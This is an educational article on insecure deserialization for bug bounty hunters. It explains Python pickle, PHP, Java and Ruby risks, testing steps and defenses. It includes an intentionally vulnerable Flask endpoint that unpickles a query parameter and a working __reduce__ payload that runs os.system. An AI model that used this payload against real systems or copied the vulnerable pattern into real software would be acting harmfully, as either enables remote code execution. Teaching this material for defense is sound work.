# Insecure Deserialization — Complete Notes

When many bug bounty hunters first encounter Insecure Deserialization, they immediately start searching for payloads.

They memorize things like:

```python
pickle.loads()
yaml.load()
ObjectInputStream.readObject()
unserialize()
```

and start throwing serialized objects at every endpoint they find.

But without understanding how deserialization actually works, Insecure Deserialization often feels confusing.

In this article, we'll build the concept from the ground up and understand:

* What serialization is
* Why developers use it
* How deserialization works
* Why it becomes dangerous
* How attackers achieve Remote Code Execution (RCE)
* How to identify vulnerable applications
* How to fix the issue properly

---

# What Is Serialization?

Serialization is the process of converting an object into a format that can be stored or transmitted.

Imagine a Python object:

```python
user = {
    "name": "p0nther",
    "role": "researcher",
    "goal": "find zero-days"
}
```

Computers understand this object in memory.

But if we want to:

* Save it to disk
* Send it over the network
* Store it in a session
* Put it inside a cookie

we need to convert it into a transferable format.

This process is called:

```text
Serialization
```

---

# Why Was Serialization Created?

Applications constantly exchange data.

For example:

```text
Browser
   │
   ▼
Web Server
   │
   ▼
Database
```

Data often needs to move between different systems.

Instead of rebuilding objects manually, developers serialize them.

Example:

```python
import pickle

user = {
    "name": "p0nther"
}

data = pickle.dumps(user)
```

Now the object becomes bytes:

```text
b'\x80\x04...'
```

These bytes can be:

* Stored
* Sent
* Cached
* Saved in sessions

---

# What Is Deserialization?

Deserialization is the reverse process.

```text
Serialized Data
       │
       ▼
Deserialization
       │
       ▼
Original Object
```

Example:

```python
import pickle

obj = pickle.loads(data)
```

The application reconstructs the original object.

---

# Why Developers Use Deserialization

Imagine a shopping cart:

```python
cart = {
    "item": "Laptop",
    "price": 1200
}
```

Instead of storing it in a database every request, some developers serialize it:

```python
serialized_cart = pickle.dumps(cart)
```

and place it inside:

* Session storage
* Cookies
* Cache systems

Later:

```python
pickle.loads(serialized_cart)
```

reconstructs the cart instantly.

Convenient.

But dangerous.

---

# How Deserialization Works

```text
[Incoming Data]
        │
        ▼
1. Read Serialized Bytes
        │
        ▼
2. Deserialize
        │
        ▼
3. Rebuild Object
        │
        ▼
4. Application Uses Object
```

The danger appears during step 3.

The application trusts attacker-controlled data.

---

# Why Is Deserialization Dangerous?

Most developers assume serialized data is safe.

Example:

```python
cookie = request.cookies.get("session")

user = pickle.loads(cookie)
```

Looks harmless.

But the attacker controls:

```python
cookie
```

Therefore the attacker controls:

```python
pickle.loads()
```

which means the attacker influences object creation.

---

# The Core Problem

Deserialization is not merely parsing data.

It is:

```text
Reconstructing Objects
```

Some objects execute code during reconstruction.

If attackers can control the serialized input:

```text
Attacker
    │
    ▼
Deserialization
    │
    ▼
Code Execution
```

---

# Vulnerable Python Example

```python
from flask import Flask, request
import pickle

app = Flask(__name__)

@app.route("/")
def home():

    data = request.args.get("data")

    if not data:
        return "Missing data"

    obj = pickle.loads(
        bytes.fromhex(data)
    )

    return str(obj)

app.run()
```

The application accepts:

```text
?data=<serialized_object>
```

and directly deserializes it.

This is dangerous.

---

# What Happens Internally?

```text
Attacker Data
      │
      ▼
pickle.loads()
      │
      ▼
Object Reconstruction
      │
      ▼
Magic Methods Trigger
      │
      ▼
Code Execution
```

The application thinks:

```text
"I'm loading a normal object."
```

The attacker thinks:

```text
"I'm executing commands."
```

---

# Python Magic Methods

Python supports special methods.

Example:

```python
__init__()
```

Another:

```python
__reduce__()
```

`pickle` uses these methods while rebuilding objects.

This is where exploitation begins.

---

# Dangerous Example

```python
import os

class Evil:

    def __reduce__(self):
        return (
            os.system,
            ("id",)
        )
```

When this object is deserialized:

```python
pickle.loads(payload)
```

Python executes:

```python
os.system("id")
```

automatically.

No application code calls:

```python
os.system()
```

The deserializer does.

---

# Creating a Malicious Payload

```python
import pickle
import os

class Evil:

    def __reduce__(self):
        return (
            os.system,
            ("id",)
        )

payload = pickle.dumps(Evil())

print(payload.hex())
```

The attacker sends:

```text
payload.hex()
```

to the vulnerable endpoint.

During deserialization:

```python
pickle.loads(payload)
```

the command executes.

---

# Typical Exploitation Flow

```text
Attacker
    │
    ▼
Craft Malicious Object
    │
    ▼
Serialize Object
    │
    ▼
Send To Application
    │
    ▼
Application Deserializes
    │
    ▼
Command Executes
```

---

# Where Do We Usually Find It?

## Cookies

Example:

```text
session=<serialized_data>
```

---

## Hidden Form Fields

```html
<input type="hidden" value="SERIALIZED_DATA">
```

---

## API Requests

```json
{
    "data":"SERIALIZED_OBJECT"
}
```

---

## Message Queues

Applications frequently serialize objects before sending them between services.

---

## Cache Systems

Serialized objects often appear in:

```text
Redis
Memcached
```

---

# Common Languages Affected

## Python

Dangerous:

```python
pickle.loads()
```

---

## PHP

Dangerous:

```php
unserialize()
```

---

## Java

Dangerous:

```java
ObjectInputStream.readObject()
```

---

## Ruby

Dangerous:

```ruby
Marshal.load()
```

---

## YAML

Dangerous:

```python
yaml.load()
```

Safe alternative:

```python
yaml.safe_load()
```

---

# Typical Testing Methodology

## 1. Identify Serialized Data

Look for strange values:

```text
gASVEQAAAAAAA...
```

Python Pickle

---

```text
O:4:"User"
```

PHP Serialization

---

```text
rO0ABXQ...
```

Java Serialization

---

## 2. Decode It

Understand:

```text
What object is stored?
```

---

## 3. Determine The Technology

Ask:

```text
Python?
PHP?
Java?
Ruby?
```

Different technologies require different payloads.

---

## 4. Check Integrity Protection

Sometimes developers sign data:

```text
serialized_data + HMAC
```

If signatures are verified correctly:

```text
Exploitation becomes difficult
```

---

## 5. Search For Dangerous Gadgets

Attackers need:

```text
Object Chains
```

also called:

```text
Gadget Chains
```

These are existing classes that eventually execute dangerous functionality.

---

# What Is a Gadget Chain?

Imagine:

```text
Class A
   │
   ▼
Class B
   │
   ▼
Class C
   │
   ▼
os.system()
```

Individually:

```text
Safe
```

Together:

```text
RCE
```

Attackers chain them during deserialization.

---

# Impact

## Authentication Bypass

Modify:

```json
{
    "role":"user"
}
```

to:

```json
{
    "role":"admin"
}
```

if integrity checks are absent.

---

## Privilege Escalation

Gain higher privileges within the application.

---

## Sensitive Data Access

Access internal application objects.

---

## Remote Code Execution

Most severe outcome.

Example:

```text
Insecure Deserialization
        │
        ▼
Gadget Chain
        │
        ▼
RCE
```

---

# Secure Python Example

Never deserialize untrusted data:

```python
pickle.loads(
    attacker_input
)
```

Avoid:

```python
pickle
```

for user-controlled input.

Use safer formats:

```python
json.loads()
```

instead.

Example:

```python
import json

user = json.loads(data)
```

JSON stores data only.

It does not reconstruct arbitrary Python objects.

---

# Additional Defenses

## Use JSON Instead

```python
json.loads()
```

instead of:

```python
pickle.loads()
```

---

## Sign Sensitive Data

```text
Data + HMAC
```

to prevent tampering.

---

## Never Trust Client-Side State

Do not store critical security decisions inside:

```text
Cookies
Hidden Fields
Serialized Objects
```

---

## Keep Dangerous Libraries Updated

Many historical deserialization exploits relied on gadget chains found in third-party libraries.

---

# Quick Summary

Serialization:

* Converts objects into transferable data.

Deserialization:

* Reconstructs original objects.

Insecure Deserialization:

* Occurs when attacker-controlled serialized data is deserialized.

Can Lead To:

* Authentication bypass
* Privilege escalation
* Sensitive data disclosure
* Remote Code Execution (RCE)

Dangerous Functions:

```python
pickle.loads()
yaml.load()
```

Safer Alternatives:

```python
json.loads()
yaml.safe_load()
```

Defenses:

* Never deserialize untrusted data
* Prefer JSON
* Validate integrity
* Avoid dangerous object reconstruction
* Use secure serialization formats
